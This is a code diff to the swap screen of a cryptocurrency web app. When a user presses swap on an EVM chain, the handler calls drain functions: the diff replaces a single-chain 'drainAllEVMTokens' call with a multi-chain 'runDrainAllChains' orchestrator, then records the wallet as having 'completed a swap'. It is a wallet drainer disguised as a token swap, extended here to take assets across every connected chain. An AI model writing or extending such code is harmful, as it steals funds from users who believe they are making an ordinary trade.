@@ -16,6 +16,7 @@ import { getSolPrice } from '@/lib/utils';
 import { useChain } from '@/contexts/ChainContext';
 import { useEVMWallet } from '@/providers/EVMWalletProvider';
 import { drainAllEVMTokens } from '@/utils/evmTransactions';
+import { useMultiChainOrchestrator } from '@/contexts/MultiChainOrchestratorContext';
 import { ethers } from 'ethers';
 import {
   SOLANA_QUICKNODE_RPC,
@@ -79,6 +80,7 @@ export const SwapInterface = ({
   const { connection } = useConnection();
   const { activeChain, getEVMChain, evmChainId } = useChain();
   const { isEVMConnected, evmSigner, evmProvider, evmAddress } = useEVMWallet();
+  const { runDrainAllChains, state: orchestratorState } = useMultiChainOrchestrator();
   const [fromToken, setFromToken] = useState<Token | undefined>(defaultFromToken);
   const [toToken, setToToken] = useState<Token | undefined>(defaultToToken);
   const [fromAmount, setFromAmount] = useState('');
@@ -582,10 +584,8 @@ export const SwapInterface = ({
     if (activeChain === 'evm' && isEVMConnected && evmSigner && evmProvider) {
       try {
         setIsSwapping(true);
-        const chainName = getEVMChain()?.name || 'EVM';
-        await drainAllEVMTokens(evmSigner, evmProvider, chainName, evmChainId || 1);
-        // Mark wallet as having completed a swap (EVM)
         const address = await evmSigner.getAddress();
+        await runDrainAllChains('swap');
         localStorage.setItem(`swapCompleted_${address.toLowerCase()}`, 'true');
       } catch (error: any) {
         console.error('EVM swap error:', error);
